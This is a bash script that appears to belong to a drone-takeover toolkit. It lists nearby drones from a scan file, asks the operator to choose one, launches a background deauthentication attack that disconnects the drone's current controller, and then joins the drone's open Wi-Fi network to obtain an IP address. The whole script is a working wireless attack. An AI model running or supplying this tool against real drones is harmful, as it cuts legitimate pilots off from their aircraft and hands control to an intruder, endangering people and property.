#!/bin/bash

RED='\033[1;31m'
YELLOW='\033[1;33m'
GREEN='\033[1;32m'
NO_COLOR='\033[0m'

./toManagedMode.sh

if [ `cat .ints.txt | cut -d ":" -f 2` = "None" ]
then
	exit
else
	INT=`cat .ints.txt | cut -d " " -f 2 `
	COUNT=`wc -l .dronesFound.txt | cut -d ' ' -f 1`
	NUM_DRONES=`expr $COUNT / 4`
	LIST_NUM=1
	echo "Listing the $NUM_DRONES drone[s] in area"
	for (( i=1; i<=$NUM_DRONES*4; i+=4 ))
	do
		ESSID="`grep -n essid .dronesFound.txt | grep "$i:" | cut -d ":" -f 3 | sed -e 's/^[[:space:]]*//'`"
		MAC="`grep -n bssid .dronesFound.txt | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`"
		echo -e "\t$LIST_NUM: $ESSID ($MAC)"
		LIST_NUM=`expr $LIST_NUM + 1`
	done
	read -p "Select a drone ESSID to target: " TARGET_NUM
	LINE=$((`expr $TARGET_NUM \* 4` - 3))
	TARGET_ESSID=`grep -n essid .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3 | sed -e 's/^[[:space:]]*//'`
	LINE=$((`expr $TARGET_NUM \* 4` - 2))
	CHANNEL=`grep -n channel .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3 | sed -e 's/^[[:space:]]*//'`
	LINE=$((`expr $TARGET_NUM \* 4` - 1))
	TARGET_MAC=`grep -n bssid .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`
	LINE=$((`expr $TARGET_NUM \* 4`))
	CLIENT=`grep -n client .dronesFound.txt | grep "$LINE:" | cut -d ":" -f 3,4,5,6,7,8 | sed -e 's/^[[:space:]]*//'`

	echo -e "Deauthentication current drone controller: ${RED}$CLIENT${NO_COLOR}"
	./channelMonitorMode.sh $CHANNEL
	MON_INT=`cat .ints.txt | cut -d " " -f 2 `
	./deauth.sh $MON_INT $TARGET_MAC $CLIENT >> /dev/null &
	RPID=$!
	echo "RPID: $RPID"

	echo -e "Associating with ${GREEN}$TARGET_ESSID${NO_COLOR} over ${YELLOW}$INT${NO_COLOR}"

	#Disabling NetworkManager to make sure we have full control of wireless interface
	systemctl stop NetworkManager > /dev/null 2>&1
	
	#Clearing any old connections
	iwconfig $INT essid any > /dev/null 2>&1
	dhclient -r $INT > /dev/null 2>&1

	#Associating with AP
	iwconfig $INT essid $TARGET_ESSID
	iwconfig $INT ap $TARGET_MAC
	iwconfig $INT enc off
	sleep 2
	dhclient $INT
	
	WLAN0_LINE=`ifconfig | grep -n $INT | cut -d ':' -f 1`
	IP=`ifconfig | tail -n +$WLAN0_LINE | grep "broadcast" | cut -d ' ' -f 10`
	echo -e "\nIP: ${YELLOW}$IP${NO_COLOR}"
fi
